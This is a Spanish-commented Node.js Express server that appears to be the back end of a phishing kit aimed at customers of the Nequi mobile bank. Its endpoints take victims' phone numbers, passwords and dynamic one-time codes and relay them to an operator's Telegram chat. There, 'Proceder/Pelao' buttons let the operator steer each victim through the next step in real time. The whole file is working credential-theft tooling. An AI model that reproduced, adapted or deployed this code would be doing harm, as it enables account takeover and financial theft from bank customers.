const express = require('express');
const axios = require('axios');
const bodyParser = require('body-parser');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(bodyParser.json());

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID   = process.env.CHAT_ID;
const respuestas = {};

async function enviarConBotones(mensaje, id, textoCorrecto = "✅ Correcto", textoIncorrecto = "❌ Incorrecto") {
  const keyboard = {
    inline_keyboard: [
      [
        { text: textoCorrecto, callback_data: `correcto:${id}` },
        { text: textoIncorrecto, callback_data: `incorrecto:${id}` }
      ]
    ]
  };

  await axios.post(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    { chat_id: CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard }
  );
}

// ——————————————
// 1) LOGIN (paso 1) con botón
// ——————————————
app.post('/enviar-telegram', async (req, res) => {
  const apiKey   = req.headers['x-api-key-authorization'];
  const clientId = req.headers['x-client-id'];
  if (apiKey !== 'Zx7Yw9Qp2Rt4Uv6WbA' || clientId !== 'user3') {
    return res.status(401).json({ error: 'No autorizado' });
  }

  const { phoneNumber, password, id } = req.body;
  const mensaje = `⭐️⭐️ <b>Nequi Paso 1</b> ⭐️⭐️\n\n📱 <b>Número:</b> <code>${phoneNumber}</code>\n🔒 <b>Clave:</b> ${password}`;

  try {
    await enviarConBotones(mensaje, id);
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Error al enviar login:', err.message);
    res.status(500).json({ error: 'No se pudo enviar mensaje' });
  }
});

// ——————————————
// 2) MENSAJE PLANO (sin botón)
// ——————————————
app.post('/enviar-telegram-no-btn', async (req, res) => {
  const apiKey   = req.headers['x-api-key-authorization'];
  const clientId = req.headers['x-client-id'];
  if (apiKey !== 'Zx7Yw9Qp2Rt4Uv6WbA' || clientId !== 'user3') {
    return res.status(401).json({ error: 'No autorizado' });
  }

  const { mensaje } = req.body;
  try {
    await axios.post(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      { chat_id: CHAT_ID, text: mensaje, parse_mode: 'HTML' }
    );
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Error al enviar plano:', err.message);
    res.status(500).json({ error: 'No se pudo enviar mensaje' });
  }
});

// ————————————————————————
// 3) DINÁMICA 1 (solo número, clave, dinámica 1)
// ————————————————————————
app.post('/dinamica-1', async (req, res) => {
  const apiKey   = req.headers['x-api-key-authorization'];
  const clientId = req.headers['x-client-id'];
  if (apiKey !== 'Zx7Yw9Qp2Rt4Uv6WbA' || clientId !== 'user3') {
    return res.status(401).json({ error: 'No autorizado' });
  }

  const { phoneNumber, password, dinamica1, id } = req.body;

  const mensaje = `
⭐️⭐️ <b>Dinámica 1</b> ⭐️⭐️

📱 <b>Número:</b> <code>${phoneNumber}</code>
🔒 <b>Clave:</b> ${password}
🔐 <b>Clave Dinámica 1:</b> <code>${dinamica1}</code>`.trim();

  try {
    await enviarConBotones(mensaje, id, "👉 Proceder", "🚫 Pelao");
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Error en /dinamica-1:', err.message);
    res.status(500).json({ error: 'No se pudo enviar mensaje' });
  }
});

// ————————————————————————
// 4) DINÁMICA 3 (solo número, clave, dinámica 3)
// ————————————————————————
app.post('/dinamica-3', async (req, res) => {
  const apiKey   = req.headers['x-api-key-authorization'];
  const clientId = req.headers['x-client-id'];
  if (apiKey !== 'Zx7Yw9Qp2Rt4Uv6WbA' || clientId !== 'user3') {
    return res.status(401).json({ error: 'No autorizado' });
  }

  const { phoneNumber, password, dinamica3, id } = req.body;

  const mensaje = `
⭐️⭐️ <b>Dinámica 3</b> ⭐️⭐️

📱 <b>Número:</b> <code>${phoneNumber}</code>
🔒 <b>Clave:</b> ${password}
🔐 <b>Clave Dinámica 3:</b> <code>${dinamica3}</code>`.trim();

  try {
    await enviarConBotones(mensaje, id, "🚫 Finalizar", "👉 Seguir");
    res.json({ status: 'ok' });
  } catch (err) {
    console.error('❌ Error en /dinamica-3:', err.message);
    res.status(500).json({ error: 'No se pudo enviar mensaje' });
  }
});

// ——————————————
// Webhook (botones)
// ——————————————
app.post('/webhook', (req, res) => {
  const cb = req.body.callback_query;
  if (cb && cb.data) {
    const [estado, id] = cb.data.split(':');
    respuestas[id] = estado;
    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      callback_query_id: cb.id,
      text: `Seleccionaste: ${estado}`,
      show_alert: true
    }).catch(console.error);
  }
  res.sendStatus(200);
});

// ——————————————
// Consultar estado
// ——————————————
app.get('/estado/:id', (req, res) => {
  const id = req.params.id;
  res.json({ estado: respuestas[id] || null });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🟢 Servidor corriendo en http://localhost:${PORT}`);
});
